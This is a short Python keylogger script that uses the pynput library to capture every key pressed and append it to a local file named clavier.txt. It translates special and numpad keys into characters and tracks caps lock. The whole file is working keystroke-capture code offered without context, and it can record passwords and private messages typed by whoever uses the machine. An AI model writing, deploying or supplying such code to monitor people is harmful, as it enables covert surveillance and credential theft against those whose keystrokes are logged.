from pynput.keyboard import Listener

instruf = False

def press(key):
	global instruf 
	fichier = open("clavier.txt",'a+', encoding = "utf-8")
	result = str(key)
	result = result.replace("'","")
	if result == "Key.caps_lock" :
		result = ""
		if  instruf == True : 
			 instruf = False
		else :
			 instruf = True
			
	if result == "Key.space" : 
		result = " "
	elif result == "Key.ctrl_l" : 
		result = ""
	elif result == "Key.alt_gr" : 
		result = ""
	elif result == "Key.alt_l" :
		result = ""
	elif result == "Key.enter" : 
		result = "\n"
	elif result == '""' : 
		result = "'"
	elif result == "Key.left" : 
		result = ""
	elif result == "Key.right" : 
		result = ""
	elif result == "Key.up" : 
		result = ""
	elif result == "Key.down" : 
		result = ""
	elif result == "Key.enter" : 
		result = "\n"
	elif result == "<96>" :
		result = "0"
	elif result == "<97>" :
		result = "1"
	elif result == "<98>" :
		result = "2"
	elif result == "<99>" :
		result = "3"
	elif result == "<100>" :
		result = "4"
	elif result == "<101>" :
		result = "5"
	elif result == "<102>" :
		result = "6"
	elif result == "<103>" :
		result = "7"
	elif result == "<104>" :
		result = "8"
	elif result == "<105>" :
		result = "9"
	elif result == "<110>" :
		result = "."
	
	if instruf == True:
		fichier.write("{}".format(result.upper()))
		fichier.close()
		
	else :
		fichier.write("{}".format(result))
		fichier.close()

with Listener(on_press = press) as Listener :
	Listener.join() 
